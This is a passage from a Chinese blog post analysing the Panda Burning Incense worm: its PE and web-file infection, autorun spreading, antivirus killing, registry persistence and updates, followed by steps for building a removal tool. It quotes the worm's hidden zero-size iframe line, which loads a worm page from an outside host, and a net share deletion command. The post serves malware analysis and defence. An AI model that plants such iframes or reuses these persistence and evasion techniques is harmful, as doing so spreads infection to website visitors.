+<p>（4）感染PE文件 – 感染方式1</p>
+<p>将病毒内容直接覆盖到要感染程序，感染目标文件后缀类型有：EXE、SCR、PIF、COM。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /daac6bc4eda8feefda603aa50c6d1219.png" alt=""></p>
+<p>f_HackWay1:</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /31877e5ba482d9a513f2db63cfe40d2e.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_201716.png"></p>
+<p>（5）感染PE文件 – 感染方式2</p>
+<p>网页感染：感染目标文件后缀类型有：htm, html, asp, php, jsp, aspx。</p>
+<p>主要将字符串（\&lt;iframe src=<a href="http://www.krvkr.com/worm.htm" target="_blank" rel="noopener">http://www.krvkr.com/worm.htm</a> width=0<br>height=0>\&lt;/iframe>）添加到文件末尾。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /3d599eb3df0203a85dacb153c0d2f5b2.png" alt=""></p>
+<p>f_HackWays:</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /c5e447aa7ca95e270464cc0e791dfa15.png" alt=""></p>
+<h4 id="2-自我复制-时钟周期6s"><a href="#2-自我复制-时钟周期6s" class="headerlink" title="2. 自我复制 - 时钟周期6s"></a>2. 自我复制 - 时钟周期6s</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /96329f95d5f86de4586e8b5b7d56a72d.png" alt=""></p>
+<p>检索各个磁盘的根目录是否存在setup.exe和autorun.inf文件，存在则删除它们。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /52796156c82ef182a8d0ce6ed8866029.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_211750.png"></p>
+<p>将自身复制到 盘符:\setup.exe</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /bab59d094eae3ba5ac12da9e71d4bbf0.png" alt=""></p>
+<p>遍历磁盘, 创建“盘符:\autorun.inf”文件。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /43f774f9d3d45cba2e7c1c32d7c7f033.png" alt=""></p>
+<p>设置setup.exe文件属性为 \&lt;系统,隐藏></p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /35c6d3c3602e7f215ba507ff62dc86fc.png" alt=""></p>
+<p>设置autorun.inf文件属性为 \&lt;系统，隐藏>，同时将setup.exe设置为自启</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /cc0bd28de1384b15ed5fc4452bc57ed1.png" alt=""></p>
+<h4 id="3-局域网传播"><a href="#3-局域网传播" class="headerlink" title="3. 局域网传播"></a>3. 局域网传播</h4><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /3f3ba872ec86ee495c56974d42b7b775.png" alt=""></p>
+<h3 id="2-2-4-主要功能函数sub-40D088-–-其他"><a href="#2-2-4-主要功能函数sub-40D088-–-其他" class="headerlink" title="2.2.4 主要功能函数sub_40D088 – 其他"></a>2.2.4 主要功能函数sub_40D088 – 其他</h3><p>此函数主要功能为通过修改注册表实现自我保护，连接网站实现自我更新等功能。</p>
+<p>该函数中设置了6个时钟周期，定时执行不同的功能。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /072794ed92a01811679be3ba3c551aec.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_140852.png"></p>
+<h4 id="TimerFunc-1（1s）"><a href="#TimerFunc-1（1s）" class="headerlink" title="TimerFunc_1（1s）"></a>TimerFunc_1（1s）</h4><p>（1）提升进程权限</p>
+<p>（2）遍历窗口名, 向指定窗口名发送QUIT消息, 并结束指定进程，大多为杀毒防护软件。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /0fd68e49dbd870b0dc8c707816cd9ae5.png" alt="C:\\Users\\Administrator\\Desktop\\xmsx\\2018-07-12_140723.png"></p>
+<p>（3）扫描进程，如果有检测到以下进程则结束它，下图为部分截图：</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /e94b531bd2b9e657b20e2e08d2e8d470.png" alt=""></p>
+<p>（4）修改注册表，设置spo0lsv.exe开机启动，设置文件（夹）隐藏</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /aaf2a1263ad32518683fd9a2aa36a1f6.png" alt=""></p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /79bb7158fbc82b927795d121ffb8f115.png" alt=""></p>
+<h4 id="TimerFunc-2（1200s）"><a href="#TimerFunc-2（1200s）" class="headerlink" title="TimerFunc_2（1200s）"></a>TimerFunc_2（1200s）</h4><p>通过URL地址更新</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /be676bc87e3e64ffa6bd7bd897019c81.png" alt=""></p>
+<h4 id="TimerFunc-3（10s）"><a href="#TimerFunc-3（10s）" class="headerlink" title="TimerFunc_3（10s）"></a>TimerFunc_3（10s）</h4><p>（1）通过URL地址更新</p>
+<p>（2）删除网络共享：net share ipc\$ /del 删除ipc\$共享</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /7a733a05a6b18e734baacc531e8d8a05.png" alt=""></p>
+<p>（3）关闭当前时钟</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /6117ad7c44c521a42b711cc4dd95f9c0.png" alt=""></p>
+<h4 id="4-TimerFunc-4（6s）"><a href="#4-TimerFunc-4（6s）" class="headerlink" title="4. TimerFunc_4（6s）"></a>4. TimerFunc_4（6s）</h4><p>将杀毒软件服务停止，并删除注册表启动项。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /ef4d3a4770edc85052f8dd56965a560c.png" alt=""></p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /168579d479d66f9ceae38624f5c932a0.png" alt=""></p>
+<h4 id="TimerFunc-5（10s）"><a href="#TimerFunc-5（10s）" class="headerlink" title="TimerFunc_5（10s）"></a>TimerFunc_5（10s）</h4><p>字符串被加密操作过，根据特征猜测可能是网址，似乎是对一些网址做了操作。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /2b741b19c4024514ed63e91dc128b235.png" alt=""></p>
+<h4 id="TimerFunc-6（180s）"><a href="#TimerFunc-6（180s）" class="headerlink" title="TimerFunc_6（180s）"></a>TimerFunc_6（180s）</h4><p>仍然是从某个网址上下载文件，应该不是关键操作。</p>
+<p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /62979bbba4fce074fa91517a10609822.png" alt=""></p>
+<h1 id="3．解决方案"><a href="#3．解决方案" class="headerlink" title="3．解决方案"></a>3．解决方案</h1><h2 id="3-1-病毒行为"><a href="#3-1-病毒行为" class="headerlink" title="3.1 病毒行为"></a>3.1 病毒行为</h2><p>病毒行为1：病毒本身创建了名为“spo01sv.exe”的进程，该进程文件的路径为“C:\WINDOWS\system32\drivers\spo01sv.exe”。</p>
+<p>病毒行为2：在注册表KCU\Software\Microsoft\Windows\CurrentVersio</p>
+<p>n\Run”中创建“svcshare”，用于在开机时启动位于“C:\WINDOWS\system3</p>
+<p>2\drivers\spo0lsv.exe”的病毒程序。</p>
+<p>病毒行为3：修改注册表，使得隐藏文件无法通过普通的设置进行显示，该位置为HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Adva</p>
+<p>nced\Folder\Hidden\SHOWALL，病毒将CheckedValue的键值设置为了0。</p>
+<p>病毒行为4：将自身拷贝到根目录，并命名为“setup.exe”，同时创建“autorun.inf”用于病毒的启动，这两个文件的属性都是“隐藏”。</p>
+<p>病毒行为5：在一些目录中创建名为“Desktop_.ini”的隐藏文件。</p>
+<h2 id="3-2-杀毒工具编写步骤"><a href="#3-2-杀毒工具编写步骤" class="headerlink" title="3.2 杀毒工具编写步骤"></a>3.2 杀毒工具编写步骤</h2><h3 id="3-2-1-终止病毒进程"><a href="#3-2-1-终止病毒进程" class="headerlink" title="3.2.1 终止病毒进程"></a>3.2.1 终止病毒进程</h3><p>1.<br>利用ToolHelpAPI获得快照句柄,而后再利用Process32First和Process32Next枚举当前的进程,枚举的过程当中获取结构体ProcessEntry32这个结构体里面的相关信息(包括进程名和进程ID);</p>
+<p>2.<br>找到目标进程之后,利用OpenProcess获取当前的进程句柄,最后再利用TerminateProcess终止病毒进程.</p>
+<h3 id="3-2-2-删除文件"><a href="#3-2-2-删除文件" class="headerlink" title="3.2.2. 删除文件"></a>3.2.2. 删除文件</h3><p>调用函数Bool DeleteFile (LPCTSTR<br>lpFilename)，把lpFilename设为要指向删除的文件的文件名的指针即可,可以包含具体路径。</p>
+<h3 id="3-2-3-修复注册表，删除启动启动项"><a href="#3-2-3-修复注册表，删除启动启动项" class="headerlink" title="3.2.3 修复注册表，删除启动启动项"></a>3.2.3 修复注册表，删除启动启动项</h3><p>RegOpenKeyEx()打开目标主键,并返回句柄,然后利用RegSetValueEx进行修改键值,最后可以利用RegSetValueEx来删除键值,最后利用RegCloseKey来进行关闭。</p>
+<h3 id="3-2-3-查杀工具链接"><a href="#3-2-3-查杀工具链接" class="headerlink" title="3.2.3 查杀工具链接"></a>3.2.3 查杀工具链接</h3><p>我的GitHub·<a href="https://github.com/yusakul/PandaKiller" target="_blank" rel="noopener">https://github.com/yusakul/PandaKiller</a></p>
+<h3 id="3-2-4-工具截图"><a href="#3-2-4-工具截图" class="headerlink" title="3.2.4 工具截图"></a>3.2.4 工具截图</h3><p><img src="/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /cc6ba44f5a4339628248cbf7a10415d1.png" alt=""></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">yusakul</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /">http://yoursite.com/2018/07/13/15PB信息安全研究-病毒分析报告-熊猫烧香 /</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com" target="_blank">梁言</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/病毒/">病毒</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2018/07/06/AndroidStudio动态调试smali/"><span>AndroidStudio附加动态调试smali</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 By yusakul</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.5"></script><script src="/js/fancybox.js?version=1.5.5"></script><script src="/js/sidebar.js?version=1.5.5"></script><script src="/js/copy.js?version=1.5.5"></script><script src="/js/fireworks.js?version=1.5.5"></script><script src="/js/transition.js?version=1.5.5"></script><script src="/js/scroll.js?version=1.5.5"></script><script src="/js/head.js?version=1.5.5"></script></body></html>
